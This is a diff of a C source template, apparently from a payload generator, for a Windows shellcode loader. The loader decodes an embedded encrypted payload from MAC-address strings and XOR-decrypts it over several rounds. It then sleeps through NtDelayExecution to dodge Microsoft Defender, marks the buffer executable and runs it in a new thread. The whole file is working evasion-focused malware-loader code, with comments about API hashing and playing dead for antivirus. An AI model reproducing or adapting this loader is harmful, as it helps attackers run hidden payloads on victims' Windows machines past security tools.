@@ -1,10 +1,12 @@
 #include <Windows.h>
-#define SCSIZE <%= encrypted_payload_length %>
-#define DECODED_LENGTH <%= encrypted_payload_length*6 %> + 200
+#include <stdio.h>
 
-char * bPayload[] = { <%= encrypted_payload.to_s.gsub!(']', '').gsub!('[', '') %> };
+#define SCSIZE <%= encrypted_payload_length %>
+#define SCSIZE_DECODED <%= encrypted_payload_length*6 %>
+
+char bDecodedPayload[SCSIZE_DECODED];
+char * bPayload[SCSIZE] = { <%= encrypted_payload.to_s.gsub!(']', '').gsub!('[', '') %> };
 char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";
-char bDecodedPayload[DECODED_LENGTH];
 
 typedef union _LARGE_INTEGER {
     struct {
@@ -16,32 +18,36 @@ typedef union _LARGE_INTEGER {
         LONG HighPart;
     } u;
     __int64 QuadPart;
-    } LARGE_INTEGER, *PLARGE_INTEGER;
+} LARGE_INTEGER, *PLARGE_INTEGER;
 
-
+typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
+	BOOLEAN              Alertable,
+	PLARGE_INTEGER       DelayInterval
+);
 typedef NTSTATUS(__stdcall* fnRtlEthernetStringToAddressA)(
     PCSTR		S,
     PCSTR* Terminator,
     PVOID		Addr
     );
 
-typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
-	BOOLEAN              Alertable,
-	PLARGE_INTEGER       DelayInterval
-);
-
-typedef NTSTATUS (__stdcall *fnNtProtectVirtualMemory)(
-  HANDLE               ProcessHandle,              
-  PVOID            *BaseAddress,               
-  PULONG           NumberOfBytesToProtect,     
-  ULONG                NewAccessProtection,      
-  PULONG              OldAccessProtection        
-);
+void  *memset(void *b, int c, int len)
+{
+  int           i;
+  unsigned char *p = b;
+  i = 0;
+  while(len > 0)
+    {
+      *p = c;
+      p++;
+      len--;
+    }
+  return(b);
+}
 
 void DecodePayload()
 {
-    int lpBufSize = SCSIZE * 6;
     PCSTR terminator = NULL;
+    memset(bDecodedPayload, 0, SCSIZE_DECODED);
     PBYTE tmp = (PBYTE)(&bDecodedPayload);
 
     //TODO: API hashing here pls
@@ -49,7 +55,7 @@ void DecodePayload()
 
     for (int i = 0; i != SCSIZE ; i+=1) {
         fncMacDeobfuscate(bPayload[i], &terminator, (LPCSTR)tmp);
-        tmp = tmp + 6;
+        tmp = (PBYTE)(tmp + 6);
     }
 
 }
@@ -62,8 +68,8 @@ int DelayExecution()
     __int64             Delay = NULL;
     NTSTATUS            STATUS = NULL;
 
-    //TODO: API hashing here pls
-    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+    // TODO: add API hashing
+    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
     DWORD               _T0 = NULL, _T1 = NULL;
 
     // Converting from milliseconds to the 100-nanosecond - negative time interval
@@ -98,29 +104,32 @@ char GetKey(char control_byte)
 	}
         }
 
-void DecryptPayload(char control_byte)
-{
-        char key = GetKey(control_byte);
-        for (int i = 0; i < <%= payload_length %>; i++)
+        void DecryptPayload(char control_byte)
         {
-                bDecodedPayload[i] = bDecodedPayload[i] ^ key;
+                char key = GetKey(control_byte);
+                for (int i = 0; i < SCSIZE; i++)
+                {
+                        bDecodedPayload[i] = bDecodedPayload[i] ^ key;
+                }
         }
-}
 
 void main() {
 	DWORD dwOldProtect;
 	char* payload_fnc = NULL;
-    
     DecodePayload();
+        for(int i = 0; i < <%= encryption_rounds %>; i++)
+        {
+                DecryptPayload(bControlBytes[i]);
+        }
+        
+        VirtualProtect(bDecodedPayload, SCSIZE_DECODED, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+        
+        payload_fnc = bDecodedPayload + 1;
+        
+        //play dead for Microsoft Defender, because why not
 
-    for(int i = 0; i < <%= encryption_rounds %>; i++)
-    {
-            DecryptPayload(bControlBytes[i]);
-    }
-    payload_fnc = bDecodedPayload + 1;
-    
-	VirtualProtect(bDecodedPayload, DECODED_LENGTH, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-	    
-    (*(void (*)()) payload_fnc)();
+        CreateThread(NULL, NULL, payload_fnc, NULL, NULL, NULL);
+        //(*(void (*)()) payload_fnc)();
+
+	return;
 }
-
